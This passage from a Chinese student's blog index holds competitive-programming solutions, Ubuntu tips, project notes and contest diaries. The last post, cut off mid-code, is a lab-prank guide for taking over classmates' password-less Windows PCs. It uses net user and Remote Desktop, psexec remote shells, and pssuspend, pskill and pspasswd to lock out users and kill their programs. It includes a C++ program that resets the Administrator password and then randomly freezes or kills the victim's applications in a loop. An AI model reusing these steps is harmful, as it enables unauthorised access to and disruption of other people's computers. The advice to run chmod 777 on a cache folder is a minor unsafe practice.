{ dfs(v, d + 1, u); } } }};#include &lt;cctype&gt;#include &lt;cstdio&gt;inline int read() { int X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int main(){ int n = read(); LCA* tree = new LCA(n); for(int i = 1;i&lt;n;i++){ int u = read(); int v = read(); tree-&gt;addde(u,v,1); } tree-&gt;pre(); int m = read(); for(int i = 1;i&lt;=m;i++){ int a = read(); int b = read(); int k = read(); int lca = tree-&gt;querylca(a,b); cout &lt;&lt; ((tree-&gt;sum[a][k] + tree-&gt;sum[b][k] - tree-&gt;sum[lca][k] - tree-&gt;sum[tree-&gt;f[lca][0]][k])%MOD + MOD)%MOD &lt;&lt; endl; }} 要特别注意题目要统计的是点权不是边权，因此小心前缀和重复计算LCA的值。","tags":["题解","oi","lca"],"categories":["OI"]},{"title":"解决Ubuntu使用中遇到的几个问题","path":"/2019/2/7/Solve-Ubuntu-Problems/","content":"无法关机,一直闪光标 打开/etc/default/grub,删去里面的quiet splash,然后运行sudo update-grub,就可以在开关机时显示日志信息了. 123456GRUB_DEFAULT=0GRUB_TIMEOUT_STYLE=hiddenGRUB_TIMEOUT=10GRUB_DISTRIBUTOR=`lsb_release -i -s 2&gt; /dev/null || echo Debian`GRUB_CMDLINE_LINUX_DEFAULT=\"acpi_osi=Linux\"GRUB_CMDLINE_LINUX=\"\" 根据我的日志信息,我发现无法关机的原因是Grub在等待运行的程序90秒再强制结束,所以解决方案是关机前先关掉所有打开的程序来避免90秒等待. 网易云音乐打不开 这个问题网上很多教程都是治标不治本,本质上都是花式sudo netease-cloud-music,但是你不觉得让一个音乐播放器具有root权限很不正常(危险)吗?而且有些半吊子教程还喊你把整个用户都设为sudo不要密码…无力吐槽 正确的解决方案:经过我观察,网易云音乐在Ubuntu 18.04水土不服的主要原因一是Gnome的沙盒模式,二是不知为何对缓存文件夹没有权限,所以请 1sudo vim /usr/share/applications/netease-cloud-music.desktop 然后在%U的前面加一个--no-sandbox,然后保存退出 12345678910111213141516[Desktop Entry]Version=1.0Type=ApplicationName=NetEase Cloud MusicName[zh_CN]=网易云音乐Name[zh_TW]=網易雲音樂Comment=NetEase Cloud MusicComment[zh_CN]=网易云音乐Comment[zh_TW]=網易雲音樂Icon=netease-cloud-musicExec=netease-cloud-music --no-sandbox %UCategories=AudioVideo;Player;Terminal=falseStartupNotify=trueStartupWMClass=netease-cloud-musicMimeType=audio/aac;audio/flac;audio/mp3;audio/mp4;audio/mpeg;audio/ogg;audio/x-ape;audio/x-flac;audio/x-mp3;audio/x-mpeg;audio/x-ms-wma;audio/x-vorbis;audio/x-vorbis+ogg;audio/x-wav; 接下来在终端运行以下命令来解决缓存文件夹权限问题 1sudo chmod -R 777 ~/.cache/netease-cloud-music 反正在我的电脑上管用~ Grub Vimix主题无法安装 Vimix是目前Gnome looks网站上排名第2的主题,然而它的安装脚本犯了一个极其显然的错误,写错了一个路径名…改成这样就可以了(把/boot/grub/themes/Vimix/theme.txt改成/boot/grub/themes/theme.txt) 123456789101112131415161718192021222324252627282930#!/bin/bashROOT_UID=0# check command avalibilityfunction has_command() { command -v $1 &gt; /dev/null}if [ \"$UID\" -eq \"$ROOT_UID\" ]; then # Copy Vimix cp -a Vimix /boot/grub/themes # Set Vimix grep \"GRUB_THEME=\" /etc/default/grub 2&gt;&amp;1 &gt;/dev/null &amp;&amp; sed -i '/GRUB_THEME=/d' /etc/default/grub echo \"GRUB_THEME=\\\"/boot/grub/themes/theme.txt\\\"\" &gt;&gt; /etc/default/grub # update grub if has_command update-grub; then update-grub elif has_command grub-mkconfig; then grub-mkconfig -o /boot/grub/grub.cfg fi echo -e \" All done!\"else echo -e \" Please run this script by root...\"fi","tags":["ubuntu"],"categories":["技术"]},{"title":"Codeforces Round 536 (Div. 2)","path":"/2019/2/1/Codeforces-1106/","content":"昨天晚上打开CF突然发现有个比赛,激动至极,遂猝不及防地与@llf0703合作了一把 结果评测机锅了,Unrated…(明明是因为把Div.3标成了Div.2) 这次的题面是春节主题的,有意思 A. Lunar New Year and Cross Counting 题意过于显然,自己看吧 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 510;char a[MAXN][MAXN];#include &lt;cctype&gt;#include &lt;cstdio&gt;inline int read() { int X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}// 统计图中'X'的数量(直接n^2暴力枚举就能A了吧)/*X.X.X.X.X*/int main() { // ifstream cin(\".in\"); // ofstream cout(\".out\"); int n = read(); for (int i = 1; i &lt;= n; i++) { scanf(\"%s\", a[i] + 1); } int ans = 0; for (int i = 1; i &lt;= n; i++) { for (int j = 1; j &lt;= n; j++) { if (a[i][j] == 'X' &amp;&amp; a[i][j] == a[i - 1][j - 1] &amp;&amp; a[i][j] == a[i - 1][j + 1] &amp;&amp; a[i][j] == a[i + 1][j - 1] &amp;&amp; a[i][j] == a[i + 1][j + 1]) { ans++; } } } cout &lt;&lt; ans &lt;&lt; endl; return 0;} B. Lunar New Year and Food Ordering 十分显然的大模拟,照着题意写就好,稍稍加一个优化,就是记录一下上一次取走的最便宜的菜,不要每次从头枚举,记得开int64 代码是llf0703的,被int64和优化坑了两次罚时 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 1e5 + 10;#include &lt;cctype&gt;inline int64 read() { int64 X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}struct node { int64 cnt, price, id;} a[MAXN];int ord[MAXN];bool cmp(const node&amp; x, const node&amp; y) { return (x.price == y.price) ? x.id &lt; y.id : x.price &lt; y.price;}inline void write(int64 x) { if (x &lt; 0) putchar('-'), x = -x; if (x &gt; 9) write(x / 10); putchar(x % 10 + '0');}int main() { int n = read(); int m = read(); int64 tot = 0; for (int i = 1; i &lt;= n; i++) { a[i].cnt = read(); a[i].id = i; tot += a[i].cnt; } for (int i = 1; i &lt;= n; i++) { a[i].price = read(); } sort(a + 1, a + n + 1, cmp); for (int i = 1; i &lt;= n; i++) { ord[a[i].id] = i; } int cheapest = 1; for (int i = 1; i &lt;= m; i++) { int64 t = read(); int64 d = read(); if (d &gt; tot) { tot = 0; puts(\"0\"); continue; } if (a[ord[t]].cnt &gt;= d) { a[ord[t]].cnt -= d; tot -= d; write(a[ord[t]].price * d); putchar(' '); } else { tot -= d; d -= a[ord[t]].cnt; int pos = cheapest; int64 ans = a[ord[t]].cnt * a[ord[t]].price; a[ord[t]].cnt = 0; while (true) { if (d &gt;= a[pos].cnt) { d -= a[pos].cnt; ans += a[pos].price * a[pos].cnt; a[pos].cnt = 0; } else { a[pos].cnt -= d; cheapest = pos; ans += a[pos].price * d; break; } pos++; } write(ans); putchar(' '); } } return 0;} C. Lunar New Year and Number Division 这题第一反应是一大一小直接贪,然鹅并不会证明,比赛时也找不到反例(卡了20分钟找反例,不肯相信这么显然) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 3e5 + 10;int64 a[MAXN];#include &lt;cctype&gt;#include &lt;cstdio&gt;inline int read() { int X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}//题意:n个正整数,分成j组(自选),求最小的每组的和的平方和//贪心,每组肯定只有2个数,直接最大的加最小的? 不太可能// 1 2 100 200 500 600int main() { // ifstream cin(\".in\"); // ofstream cout(\".out\"); int n = read(); for (int i = 1; i &lt;= n; i++) { a[i] = read(); } sort(a + 1, a + n + 1); int64 ans = 0; for (int i = 1; i &lt;= n / 2; i++) { ans += (a[i] + a[n + 1 - i]) * (a[i] + a[n + 1 - i]); } cout &lt;&lt; ans &lt;&lt; endl; return 0;} D. Lunar New Year and a Wander 类似NOIP2018 D2T1,不过限制条件更少,直接优先队列BFS就行了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;vector&gt;using namespace std;const int MAXN = 100010;const int INF = 0x3f3f3f3f;class LFS { public: LFS() { memset(head, -1, sizeof head); ecnt = 0; n = 0; } LFS(int N) { memset(head, -1, sizeof head); ecnt = 0; n = N; } void adde(int from, int to, int w) { e[ecnt].to = to; e[ecnt].w = w; e[ecnt].next = head[from]; head[from] = ecnt++; } void addde(int a, int b, int w) { adde(a, b, w); adde(b, a, w); } void solve() { memset(vis, false, sizeof vis); while (!q.empty()) { q.pop(); } q.push(1); while (!q.empty()) { int u = q.top(); q.pop(); if (vis[u]) { continue; } cout &lt;&lt; u &lt;&lt; ' '; vis[u] = true; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (!vis[v]) { q.push(v); } } } } protected: struct Edge { int to, next, w; } e[MAXN * 2]; int head[MAXN]; int ecnt; int n; bool vis[MAXN]; priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; q; private: void dfs(int u, int fa) { for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (v != fa) { dfs(v, u); } } }};#include &lt;cctype&gt;#include &lt;cstdio&gt;inline int read() { int X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int main() { int n = read(); int m = read(); LFS* tree = new LFS(n); for (int i = 1; i &lt;= m; i++) { int u = read(); int v = read(); if (u == v) { continue; } tree-&gt;addde(u, v, 1); } tree-&gt;solve(); delete tree;} EF 比赛时看到Unrated心头一凉,E题基本想出来了没有写,F题放弃,有空再补上代码吧","tags":["题解","oi","codeforces"],"categories":["OI"]},{"title":"摇号机~~全新~~翻新发布","path":"/2019/2/1/RNumWPFNew/","content":"这个项目起始于2018年6月份毕业班会的需求,用WPF+Material Design写的,极简主义界面,使用方便,主要功能突出.前两天班会需求改了一下界面,换了背景 功能 兹磁(且仅支持)从txt文件打开花名册(一行一个名字),直接从Excel里面复制出来就好 如果需要抽取学号可以手动用Excel生成一个包含学号数字的TXT 文件名记忆功能,自动打开上次打开的花名册 防止重复抽奖功能 带有抽奖次数统计功能,同时可以清除抽奖次数计数而不清除防重复抽奖计数 目前还不支持内定,咕了 使用方法 因为我懒,懒的搞数字签名,所以你不能直接双击setup.exe安装,请打开Application File文件夹手动运行那个exe(本来功能简单也不需要安装) 平台支持 .NET FrameWork 4.6.2,暂时没有迁移到.NET Core 3的计划 下载地址 GitHub,进去之后点Release 友链 LLF大佬的作品,然鹅网页版鸡肋至极 截图 咕咕咕","tags":["项目"],"categories":["项目"]},{"title":"如何用C#强行A掉洛谷高精模板(P1601)","path":"/2019/1/30/Luogu-P1601/","content":"https://www.luogu.org/problemnew/show/P1601https://www.luogu.org/problemnew/show/P1601 众所周知,洛谷的C# Mono默认是没有引用System.Numerics这个程序集的,也就是说不能像Java或者Python一样直接调用内建的高精度类型 按照正常思路,但在洛谷会CE的程序 12345678910111213141516using System;using System.Numerics;namespace Solution{ class Program { public static int Main(string[] args) { var a = BigInteger.Parse(Console.ReadLine(); var b = BigInteger.Parse(Console.ReadLine(); Console.WriteLine(a+b); } }} 但是我们可以用反射技术来强行动态加载程序集!这样就可以动态调用高精度类了,详情见代码 123456789101112131415161718192021222324using System;using System.Reflection;namespace Solution{ class Program { public static void Main(string[] args) { try { var Numerics = Assembly.LoadFile(\"/usr/lib/mono/4.5/System.Numerics.dll\"); Type BigInteger = Numerics.GetType(\"System.Numerics.BigInteger\"); dynamic a = BigInteger.InvokeMember(\"Parse\", BindingFlags.Static | BindingFlags.InvokeMethod | BindingFlags.Public, null, null, new object[] { Console.ReadLine() }); dynamic b = BigInteger.InvokeMember(\"Parse\", BindingFlags.Static | BindingFlags.InvokeMethod | BindingFlags.Public, null, null, new object[] { Console.ReadLine() }); Console.WriteLine(BigInteger.InvokeMember(\"Multiply\", BindingFlags.Static | BindingFlags.InvokeMethod | BindingFlags.Public, null, null, new object[] { a, b }).ToString()); } catch (Exception ex) { Console.WriteLine(ex.Message); } } }} 顺便吐槽一下洛谷的编译器版本是mono4.6,然而运行时版本是4.5,猜了好久路径… 还有,不知道是不是反射导致的性能低下,此方法对于P1919会T掉 最后吐槽一句洛谷MarkDown编辑器的弱智自动空行,极其不适,能否给个选项关掉…","tags":["题解","oi","dotnet"],"categories":["OI"]},{"title":"贴几个VSCode的常用代码片段","path":"/2019/1/27/Llf-AK-IOI/","content":"包括常用头文件,快读等. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566{ \"Common Headers\": { \"prefix\": \"#inc\", \"scope\": \"cpp\", \"body\": [ \"#include &lt;iostream&gt;\", \"#include &lt;algorithm&gt;\", \"#include &lt;cstdio&gt;\", \"#include &lt;cstring&gt;\", \"#include &lt;fstream&gt;\", \"#include &lt;cassert&gt;\", \"using namespace std;\", \"\", \"typedef long long int64;\", \"\", \"const int INF = 0x3f3f3f3f;\", \"const int MAXN = $1;\", \"\", \"int main(){\", \"\\t//ifstream cin(\\\"$2.in\\\");\", \"\\t//ofstream cout(\\\"$2.out\\\");\", \"\\t$0\", \"\\treturn 0;\", \"}\" ] }, \"Fast Read\": { \"scope\": \"cpp\", \"prefix\": \"fastread\", \"body\": [ \"#include &lt;cctype&gt;\", \"#include &lt;cstdio&gt;\", \"\", \"inline int read()\", \"{\", \"\\tint X = 0, w = 0;\", \"\\tchar ch = 0;\", \"\\twhile (!isdigit(ch))\", \"\\t{\", \"\\t\\tw |= ch == '-';\", \"\\t\\tch = getchar();\", \"\\t}\", \"\\twhile (isdigit(ch)){\", \"\\t\\tX = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48);\", \"\\t\\tch = getchar();\", \"\\t}\", \"\\treturn w ? -X : X;\", \"}\" ] }, \"memset\": { \"scope\": \"cpp\", \"prefix\": \"mems\", \"body\": \"memset($1,$2,sizeof $1);\" }, \"Minimize\": { \"scope\": \"cpp\", \"prefix\": \"gmin\", \"body\": \"$1 = min($1,$2);\" }, \"Maximize\": { \"scope\": \"cpp\", \"prefix\": \"gmax\", \"body\": \"$1 = max($1,$2);\" }}","tags":["oi","vscode"],"categories":["OI"]},{"title":"VJudge-Anti-Cheating - VJudge比赛反抄袭程序","path":"/2019/1/17/VJudge-Anti-Cheating/","content":"基于SIM的vjudge比赛反抄袭工具，使用C#+dotnet core 2.1编写 原理和行为：使用百度搜索并下载标称，使用SIM工具比较选手程序与标称 编译 下载并安装.NET Core SDK(Windows,Linux,macOS) Windows用户可以下载SIM工具并添加到Path，Ubuntu用户可以sudo apt install similarity_tester,其他发行版用户可以自行编译SIM 123git clone https://github.com/Duanyll/VJudge-Anti-Cheatingcd VJudge-Anti-Cheating/vjacdotnet build 运行 命令行参数选项： 参数(*可选) 作用 contest 指定比赛编号 scan_timeout* 两次扫描新提交记录之间间隔多少毫秒，建议不少于30000 action* start（默认选项搜索标称并开始检查）或者clean（清除比赛数据） similarity_limit* 应该将与标称相似度高于百分之多少视为作弊，默认60 ga* VJudge的一项cookie，默认是GA1.2.905820731.1539859305,可不指定 jaxq VJudge的一项cookie，若不在命令行中指定可以保存在vjac/cookie文件中，该文件优先级更高 sessionid VJudge的一项cookie，可不指定 使用时必须使用VJudge比赛创建者账号，通过Jax.Qcookie登录。检查结果保存在比赛编号/result.md中 命令行参数示例： 1dotnet run contest=123456 scan_timeout=60000 jaxq=admin|XXXXXXXX","tags":["oi","项目"],"categories":["项目"]},{"title":"OJStatusCrawler-爬取大佬的做题记录","path":"/2018/12/9/OJStatusCrawler/","content":"我才不会告诉你我做这个项目是为了山寨llf0703,主要是为了dotnet core练手,顺便学习regex. 基于dotnet core的爬虫，主要用于爬取大佬的提交记录，用于了解大佬的做题顺序。 本来想直接通过解析HTML的形式分析网页,结果因为功能要求不高,就直接用regex了,受限于本人水平,只会写基于PHP的OJ的爬虫,(目前)对于ajax加载评测记录的OJ还很无力… 目前已支持抓取HDU与BZOJ的AC记录,POJ这段时间都无法访问,暂不添加. 项目Github仓库,可执行文件不太可能发布,请各位大佬自行build(期待dotnet core 3 单文件打包) 使用方法 1234567891011命令行使用方法:user: 指定用户名,若不指定,则从stdin读入oj: 指定OJ,若不指定,则从stdin读入 目前支持bzoj,hduoutput: 指定输出文件(默认result.md),附加到文件末尾mode: firstac(默认),ac,all(尚未支持)reverse:是否倒序输出(默认true)示例: dotnet run user=llf0703 oj=bzoj 抓取llf0703的bzoj上的AC提交记录. 爬取的结果会以markdown格式追加到指定的文件中. 建议了解 llf0703/pld","tags":["dotnet","项目","施工现场"],"categories":["项目"]},{"title":"全新自动AC机","path":"/2018/12/1/Self-AC-Machine/","content":"只有一行代码的自动AC机（直接#includestd） 1#include \"../../source/std/题目名字.cpp\" 后面可以写点废话凑够长度，也可以花式#define凑出这句话。","tags":["oi","搞事情"],"categories":["OI"]},{"title":"为你的Jekyll博客添加搜索文章功能","path":"/2018/11/28/Jekyll-Search/","content":"众所周知，Github上的Jekyll上实现自定义插件很困难，因此即使有Jekyll的搜索插件，也只能手写js代码。静态网站实现搜索原理是这样的，通过HTTP请求获取posts.json，然后本地解析里面内容实现搜索。 posts.json 1234567891011121314151617181920212223242526272829---layout: nullpermalink: /posts.json---{\t\"posts\":[\t{%- for post in site.posts -%} { \"title\" : \"{{ post.title }}\", \"date\" : \"{{ post.date | date_to_long_string }}\", \"author\" : \"{{ post.author }}\", \"tags\" : [ {%- for tag in post.tags -%} \"{{ tag }}\" {%- if forloop.rindex != 1 -%} , {%- endif -%} {%- endfor -%} ], \"url\" : \"{{ post.url }}\", \"excerpt\" : \"{{ post.excerpt | strip_html | strip_newlines | lstrip | rstrip | truncate:100 }}\" } {%- if forloop.rindex != 1 -%} , {%- endif -%} {%- endfor -%}\t]} HTTP请求 123456789101112131415let requestURL = \"/posts.json\";let request = new XMLHttpRequest();request.open(\"GET\", requestURL);request.responseType = \"text\";request.send();var posts;let section = null;request.onload = function () { let postsText = request.response; posts = JSON.parse(postsText); //console.log(postsText); initPosts(posts[\"posts\"]);}; 显示搜索框 12345678910111213141516171819202122function initSearchBox() { var box = document.createElement(\"input\"); box.setAttribute(\"type\", \"text\"); box.setAttribute(\"id\", \"search-box\"); box.setAttribute(\"placeholder\", \"搜索文章...\"); box.oninput = function () { var text = this.value; if (text != \"\") { var list = []; postList.forEach((post) =&gt; { if (post.title.search(text) &gt; -1 || post.excerpt.search(text) &gt; -1) { list.push(post); } }); showSelectedPost(list); } else { showAllPost(); } }; document.getElementById(\"nav-ul\").appendChild(box);} 滚动到底自动加载 123456789$(window).scroll(function () { var htmlHeight = $(document).height(); var clientHeight = $(window).height(); var scrollTop = $(document).scrollTop(); var he = scrollTop + clientHeight; if (he &gt;= htmlHeight * 0.9) { addListMore(); }}); 这样做就可以在不花钱的情况下，实现一个支持在线编辑的，支持自定义域名的，功能齐全的博客。","tags":["教程","jekyll"],"categories":["技术"]},{"title":"NOIP2018总结","path":"/2018/11/16/NOIP2018-Summary/","content":"Day1游记 Day2游记 讣告 重要的事情说三遍 *.ans见祖宗，十年OI一场空 *.ans见祖宗，十年OI一场空 *.ans见祖宗，十年OI一场空 347稳拿一等奖爆零了。无f__k说。还是太紧张了。其实关系不大，反正进不了冬令营 D1T1 Road 这道题我感觉比多数人都好吧，至少一眼看出了规律，三分钟写完。看到数据1e6还以为有坑，思考了十分钟后没有发现问题，A了。 D1T2 Money 进考场前5分钟才复习了exgcd，于是想了半个小时数论。突然发现a=25000背包能过，就写出来了，结果因为把break写成了continue，被洛谷极限数据压线卡掉了。（考场上根本没想到能break） D1T3 Track 这个题正解是绝对想不出来的，但是花太多时间想正解，骗分没时间了了，只拿到了直径的分。菊花图的情况比直径还好写，应该尝试写一下的。 D2T1 Travel 写的太冒险了，把优先队列开到了DFS里面，早想到要排序应该vector存边的（就是想到了这一点也没有改写代码）。基环树的情况考场上写了一个错误的贪心，但是考场上没能找出错误，该放弃T2来查错。居然没有想到暴力删边的方法（当时觉得n^2会T）来对拍，失误啊。 D2T2 Game 倒是没有什么失误，就是浪费时间太多了。手算还算错了，2x3的情况算成了40，唉。 D2T3 Defense 还是因为T2浪费时间太多，没有仔细读题，写成了小胖守皇宫。能力原因只写了n^2情况（44分）。数据开恩，给了我6个点，不知官方数据会不会全部卡WA。 综上所述， 我可以上400?!! 还是进不了冬令营。 结论：认真读题，及时全盘放弃","tags":["oi","总结","noip2018"],"categories":["OI"]},{"title":"[手动置顶]讣告","path":"/2018/11/15/Obituary/","content":"*.ans见祖宗,十年OI一场空 scoier dyl 于 noip2018 把 .out 写成了 .ans, 卒, 享年14岁 我并不打算退役的. ↓追悼会↓","tags":["oi","noip2018"],"categories":["OI"]},{"title":"NOIP2018 Day2 游记","path":"/2018/11/11/NOIP2018-Day2/","content":"今天起床晚了，不过动作比较快，7：30就到基础实验楼了，在车上坐了一会遇上了cw的大部队（校车还是没有开进来），就跟着走了，并没有遇到llf。在广场上领取了准考证就进去了。考前fy邀请我去洗手，他说考前洗手能够增加RP，我就信了他的鬼话。看到T1之后感觉RP都被洗掉了。 T1 Travel 没错我又看错题了，没有注意到只能沿到达的边返回，以为是个弱智搜索加优先队列，两分钟写出代码，顺利的没有通过样例。仔细读题后，觉得很棘手，不过看到数据范围说有情况是一棵树，那这种就很好写了，直接在每个dfs时优先选择最小的孩子走就是了，顺利通过样例和大数据。之后发现剩下一种n=m的情况只有一个环与树的情况区别不大，就先写了一个tarjan把环找出来，然后一大堆if特判，大约在9：15的样子通过了大样例。 T2 Game 这道题看到数据范围真是让我吓了一跳。感觉是状压DP+滚动数组什么的，但是对DP方程式毫无想法，对着题目傻看了二十分钟，连n=3的样例都不知道是怎么算出来的。这半个小时唯一的结论是n=1或m=1时答案为2^n，遂写了上去。然后又花了二十分钟人力枚举了2x3和3x2的情况，在尝试拿n=2，m=1e7的分，但是并没有拿到。鉴于T3我并没有什么时间去多想，所以我觉得这几乎是全卷最难的题。 T3 Defense 看到这道题时我已经不剩多少时间了，于是根本没有考虑正解，只想写n=2000的暴力44分（暴力O(n)回答每个查询）。然而！！！我又把暴力写挂了！！！能过小样例但过不了大样例，真是太奇怪了。估计得不了什么分。正解应该是某种数据结构吧。 怎么办，估分344，我好虚啊……真是太弱小了……原来D1的题这么简单是有原因的……","tags":["oi","noip2018"],"categories":["OI"]},{"title":"NOIP2018 Day1 游记","path":"/2018/11/10/NOIP2018-Day1/","content":"好气啊，昨天晚上RP++没有发出去，我肯定是受到RP–的制裁了。 早上到的比较早，7：40到的，基础实验楼前面还没有什么人。过了几分钟llf就骑车来了，我立马就走过去%了他，随后zk也来了，他问我打算考多少分，我说大概150的样子吧。 之后和llf（其实不包括他）复习了一下exgcd啊inv1啊lca啊pow什么的背诵内容，但是今天都没有考。不久cyc也来了。他远远一看就是要ak的样子。一直到7：55cw的校车都没有来，结果zk说车牌登记错了被卡在门口了。过了一会就有一大群黑白绿相间的oier徒步走了过来，zml和xyc给我们发了准考证就进去了。 T1 Road 这道题相当显然啊，让我都怀疑我是不是在考普及组了。一分钟读题五分钟码字，直接过了大样例，大概估算了一下1e6*1e5不会爆int，就不管了。这道题我连对拍的暴力都想不出来。我看我旁边的妹子对着这道题的题面看了半个小时，唉。我感觉这个题应该没有什么坑。 T2 Money 这题看到什么求最少的个数以为是二分+贪心，仔细一看发现这样不好做，应该就是一道数学题。然后看到n&lt;=100，估计是什么O(n^3)或者O(n^4)的东西，再加上半个小时前踩复习背诵了exgcd，所以我以为是数论规律题，怎么枚举一下公式什么的。之后随便找了几个数试了一下，发现m里面的数都是n里面肯定有的。最后确认了规律应该就是从n里面去掉能作为其他几个数的和的数，剩下的就是答案。于是我又在想枚举大法，先枚举一个数的倍数，两个数的倍数，三个数的倍数……似乎复杂度太高了。接下来我又想用数学公式去简化，又推了二十分钟，放弃。突然发现了这个过程好像筛法（其实早就应该看出来了），又注意到a[i]最大只有25000，就动手写了，花了五分钟研究哪里continue最快，最后秒过大样例，又造了几组随机大数据，都是秒过。算了一下复杂度大概是O(n*a)，应该能A（何况€€£还换了新电脑）。 考后听说背包也能做，不过没仔细想了。 T3 Track 啊啊啊前十分钟读错题意了，以为就是普通的树上K长路，心想今年NOIP怎么这么简单，结果有限制条件…… 然后还剩一个半小时，对正解毫无感觉，连是什么算法框架都没想到。于是就只能做特殊情况了。m=1的情况简单淀粉质，20Pts到手。但是，菊花图的情况我写炸了！！！应该是排序然后首尾相加，但我写成了排序然后第M组相邻相加！！！好气啊！退化成链的情况并没有想出来。写了一个奇怪的二分贪心，反正没有过自己造的数据，不知能不能撞对一个点。二叉树的情况就更不会写了。 此时我发现身边不少人都在扫雷了。我检查了一下文件名什么的，没太大问题，还剩十分钟的样子。 感觉今年D1的题偏简单啊，一定有不少dalao要ak。反正我是不行的。明天RP++，不要再考数论了，最好来三道模拟。但是借用zml的话，水涨船高。 12while(1) RP++;","tags":["oi","noip2018"],"categories":["OI"]},{"title":"论给电脑设密码的重要性——机房惨案的新境界","path":"/2018/10/24/Please-Set-Password/","content":"昨天颓了半个晚自习研究机房惨案黑科技，感受到了机房电脑不设密码又不开防火墙还不开UAC的巨大风险…… 在机房实际运用以下内容可能导致您被教练锤，被同学揍或者是更加严重的后果！ 以下内容的前提是对方没设密码 net user 改密码制造对方断不掉的远程桌面连接 基础：net user admin fuck把admin的密码设为fuck 把net user admin fuck复制到剪贴板里 用远程桌面连你要机惨的人 迅速按下Win+r,Ctrl+v,Enter 然后他除了重启就断不掉链接了，他的电脑上会提示“用户名或密码错误”，但是连密码输入框都不显示，趁机让他在洛谷上AKIOI吧 psexec 静默打开cmd 去搜索下载一个psexec（SysinternalsSuite里面有） cmd运行psexec \\\\他的IP -u admin -s cmd 提示输入密码，直接回车，如果直接进入他的cmd你就中奖了 你就可以在cmd里面改他的密码，删他的程序，给他的iostream加点料了 如果你被搞了 远程桌面型：告诉教练或者揍他 psexec型（很难察觉）：迅速net user admin \"\"清除密码，注销重登 没有还原卡：重启按F8，选带命令提示符的安全模式，用上面指令清密码，重启 再补充几条 12345pssuspend \\\\stu5-xxx -u admin explorer.exe #卡住他的桌面（可以换成别的程序）pssuspend \\\\stu5-xxx -u admin explorer.exe -r #恢复他的桌面pskill \\\\stu5-xxx -u admin devcpp.exe #强杀devcpp（不会保存代码）pspasswd \\\\stu5-xxx -u admin admin fuck #一键改他的密码notmyfaultc crash 0x01 #瞬间蓝屏（自己的电脑） pssuspend配合while(true)与sleep效果奇佳。 一段振奋人心的代码 请在sysinternals suite里面执行。方便起见，我把主机名写死在代码里了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;ctime&gt;#include &lt;windows.h&gt;using namespace std;int main(){\tsrand(time(NULL));\tsystem(\"psexec \\\\\\\\xxx -accepteula -u admin -p \\\"\\\" -s net user Administrator /active:yes\");\tsystem(\"psexec \\\\\\\\xxx -accepteula -u admin -p \\\"\\\" -s net user Administrator happy\");\twhile(1){ Sleep(500); switch(rand()%13){ case 0: system(\"pssuspend \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" chrome\"); break; case 1: system(\"pssuspend \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" devcpp\"); break; case 2: system(\"pssuspend \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" explorer\"); break; case 3: system(\"pssuspend \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" taskmgr\"); break; case 4: system(\"pssuspend \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" chrome -r\"); break; case 5: system(\"pssuspend \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" devcpp -r\"); break; case 6: system(\"pssuspend \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" explorer -r\"); break; case 7: system(\"pssuspend \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" taskmgr -r\"); break; case 8: system(\"pskill \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" chrome\"); break; case 9: system(\"pskill \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" devcpp\"); break; case 10: system(\"pskill \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" 